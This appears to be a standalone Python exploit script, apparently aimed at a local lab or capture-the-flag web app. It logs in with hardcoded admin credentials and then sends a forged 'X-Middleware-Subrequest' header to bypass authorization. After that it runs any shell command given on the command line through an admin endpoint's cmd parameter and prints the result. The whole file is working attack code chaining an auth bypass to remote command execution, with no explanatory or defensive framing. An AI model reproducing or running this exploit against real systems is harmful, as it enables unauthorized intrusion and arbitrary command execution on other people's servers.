#!/usr/bin/env python3
import sys
import requests
import re

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} '<command>'")
    print(f"Example: {sys.argv[0]} 'id'")
    sys.exit(1)

CMD = sys.argv[1]

BASE_URL = "http://localhost:8080"
LOGIN_URL = f"{BASE_URL}/api.php?action=login"
ADMIN_URL = f"{BASE_URL}/api.php?action=admin&cmd="

USERNAME = "admin"
PASSWORD = "Super3cret!Passw0rD"

s = requests.Session()

print("[*] Logging in...")

s.post(
    LOGIN_URL,
    data={
        "username": USERNAME,
        "password": PASSWORD
    },
    allow_redirects=True
)

# Optional check
r = s.get(f"{BASE_URL}/dashboard.php")
if "Hello" not in r.text:
    print("[-] Login failed")
    sys.exit(1)

print("[+] Logged in successfully")

print("[*] Sending X-Middleware-Subrequest auth bypass...")

headers = {
    "X-Middleware-Subrequest": "middleware:middleware:middleware"
}

r = s.get(
    ADMIN_URL + CMD,
    headers=headers
)

m = re.search(r"<pre class='output'>(.*?)</pre>", r.text, re.S)
if not m:
    print("[-] Failed to extract output")
    sys.exit(1)

print("\n===== COMMAND OUTPUT =====\n")
print(m.group(1).strip())
print("\n==========================\n")
